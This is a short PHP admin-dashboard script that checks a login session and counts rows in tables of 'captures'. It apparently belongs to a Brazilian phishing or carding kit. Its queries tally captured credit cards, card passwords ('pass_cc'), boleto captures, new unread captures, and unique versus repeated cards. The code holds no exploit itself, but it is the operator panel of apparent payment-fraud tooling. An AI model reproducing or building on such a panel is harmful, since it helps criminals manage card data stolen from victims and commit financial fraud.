<?php

ob_start();
session_start();

if(isset($_SESSION['login_user']))
	{



error_reporting(0);
ini_set(“display_errors”, 0 );

require_once ("config.php");
require_once ("conexao.php");




$sql1="SELECT count(id) AS  total FROM produtos";

$result=mysqli_query($mysqli,$sql1);
$values=mysqli_fetch_assoc($result);
$produtos_add=$values['total'];


$sql2="SELECT count(id) AS  total FROM capturas";

$result2=mysqli_query($mysqli,$sql2);
$values2=mysqli_fetch_assoc($result2);
$capturas_add=$values2['total'];


$sql3="SELECT count(id) AS  total FROM capturas_boleto";

$result3=mysqli_query($mysqli,$sql3);
$values3=mysqli_fetch_assoc($result3);
$capturas_add1=$values3['total'];




$sql4="SELECT count(id) AS  total FROM capturas where ler=2";

$result4=mysqli_query($mysqli,$sql4);
$values4=mysqli_fetch_assoc($result4);
$cc_new=$values4['total'];


$sql5="SELECT count(id) AS  total FROM capturas_boleto where ler=2";

$result5=mysqli_query($mysqli,$sql5);
$values5=mysqli_fetch_assoc($result5);
$leto_new=$values5['total'];



$sql6="SELECT count(id) AS  total FROM capturas where pass_cc != 'null'";

$result6=mysqli_query($mysqli,$sql6);
$values6=mysqli_fetch_assoc($result6);
$cc_consutavel=$values6['total'];


$sql7="SELECT count(id) AS  total FROM capturas where qtd= '2'";

$result7=mysqli_query($mysqli,$sql7);
$values7=mysqli_fetch_assoc($result7);
$cc_repetida =$values7['total'];

$sql8="SELECT count(id) AS  total FROM capturas where qtd= '1'";

$result8=mysqli_query($mysqli,$sql8);
$values8=mysqli_fetch_assoc($result8);
$cc_unica =$values8['total'];


	}

?>



